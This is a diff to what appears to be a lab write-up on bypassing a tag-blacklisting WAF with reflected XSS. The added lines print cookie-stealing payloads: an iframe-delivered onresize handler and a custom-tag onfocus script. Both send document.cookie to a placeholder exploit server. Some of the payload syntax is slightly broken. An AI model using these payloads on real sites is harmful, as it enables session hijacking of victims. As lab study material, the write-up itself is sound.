@@ -1,6 +1,8 @@
-# Reflected XSS into HTML context with most tags and attributes blocked (WAF bypass)
+# Reflected XSS into HTML context with most tags and attributes blocked (WAF bypass) + EXTRA: customtags
 
 We found that there is a WAF using a blacklist of HTML tags
+
+[portswigger - tags and events to copy in intruder](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
 Using Burp Intruder and the response status codes, we identify which tags are allowed.
 
@@ -39,10 +41,24 @@ Let’s analyze what we are doing:
 > onload might be blocked by the victim domain’s WAF if it were routed through that WAF, but because the onload handler runs from our server it does not pass through the victim’s WAF.
 
 Example to exfiltrate cookies:
-
+if doesn't works try url-code
 ```js
 <iframe
-  src="https://<IP>/?search=%22%3E%3Cbody%20onresize%3Dfetch%28%27https%3A%2F%2F<EXPLOIT-SV>%2Fexploit%2F%3Fcookie%3D%27%2Bbtoa%28document.cookie%29%29%3E"
+  src="https://<IP>/?search="><body onresize=fetch('https://<EXPLOIT-SV>/exploit/?cookie='+btoa(document.cookie),{mode:'no-cors'})>"
   onload="this.style.width='1px';this.offsetWidth;this.style.width='500px'">
 </iframe>
+```
+
+**EXTRA -> EJEMPLO CUSTOM TAGS**
+
+POC
+```html
+custom-tag onfocus="alert(1)" id="x" tabindex="1">
+https://<IP>?search=custom-tag onfocus="alert(1)" id="x" tabindex="1">#x
+```
+
+```js
+<script> 
+location = 'https://<IP>/?search=<xss id=x onfocus="fetch(\'https://<EXPLOIT-SV>/?cookie=\' btoa(document.cookie),{mode:'no-cors'})" tabindex=1>#x'; 
+</script>
 ```
